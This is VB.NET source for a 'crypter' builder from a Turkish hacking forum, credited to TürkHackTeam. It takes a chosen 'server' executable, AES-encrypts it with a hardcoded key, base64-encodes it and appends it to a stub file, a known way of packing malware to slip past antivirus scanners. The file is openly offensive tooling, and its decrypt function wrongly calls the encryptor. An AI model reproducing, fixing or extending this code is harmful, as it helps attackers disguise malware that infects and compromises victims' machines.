
'############################
'###   TürkHackTeam.Org   ###
'###  ARGE Team - TheEos  ###
'###   Skype : tincebiz   ###
'############################

Public Class xfvbbdtbd

    Dim F As String
    Function Secure(ByVal data As Byte()) As Byte()
        Using SA As New System.Security.Cryptography.RijndaelManaged
            SA.IV = New Byte() {8, 5, 7, 3, 2, 6, 4, 9, 1, 2, 7, 5, 1, 6, 3, 4}
            SA.Key = New Byte() {4, 3, 6, 1, 5, 7, 2, 1, 9, 4, 6, 2, 3, 7, 5, 8}
            Return SA.CreateEncryptor.TransformFinalBlock(data, 0, data.Length)
        End Using
    End Function
    Function UnSecure(ByVal data As Byte()) As Byte()
        Using SA As New System.Security.Cryptography.RijndaelManaged
            SA.IV = New Byte() {8, 5, 7, 3, 2, 6, 4, 9, 1, 2, 7, 5, 1, 6, 3, 4}
            SA.Key = New Byte() {4, 3, 6, 1, 5, 7, 2, 1, 9, 4, 6, 2, 3, 7, 5, 8}
            Return SA.CreateEncryptor.TransformFinalBlock(data, 0, data.Length)
        End Using
    End Function
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim the As New OpenFileDialog
        With the
            .FileName = "*.exe"
            .Title = "Server Seçiniz..."
            .Filter = "Uygulamalar (*.exe)|*.exe"
            .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                F = .SafeFileName
                TextBox1.Text = .FileName
            End If
        End With
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Try
            Dim eos As New SaveFileDialog
            With eos
                .FileName = "*.exe"
                .Title = "Kayıt Yeri..."
                .Filter = "Uygulamalar (*.exe)|*.exe"
                .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                If .ShowDialog = Windows.Forms.DialogResult.OK Then
                    Dim bMjdLefPZMABdkQUrMdxtfpjj As String = "[naptiy]"
                    Dim UNUHBPPZhTqXxIFHgtQeEDTFM As Byte() = My.Resources.Stub
                    My.Computer.FileSystem.WriteAllBytes(.FileName, UNUHBPPZhTqXxIFHgtQeEDTFM, False)
                    Dim qVCLkzZqttRLHYwlfzTaytEXr As Byte() = Secure(My.Computer.FileSystem.ReadAllBytes(TextBox1.Text))
                    System.IO.File.AppendAllText(.FileName, bMjdLefPZMABdkQUrMdxtfpjj & Convert.ToBase64String(qVCLkzZqttRLHYwlfzTaytEXr) & bMjdLefPZMABdkQUrMdxtfpjj & F)
                    MsgBox("Birleştirme İşlemi Tamamlandı !", MsgBoxStyle.Information + MsgBoxStyle.OkOnly, "TheEos")
                End If
            End With
        Catch ex As Exception
            MsgBox("Hata Oluştu !" & ex.Message, MsgBoxStyle.Critical, "TheEos")
        End Try
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

    End Sub

    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        MsgBox("Bu crypter DesDeRe* Tarafından THT icin yapılmıstır.")
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Application.Exit()
    End Sub
End Class
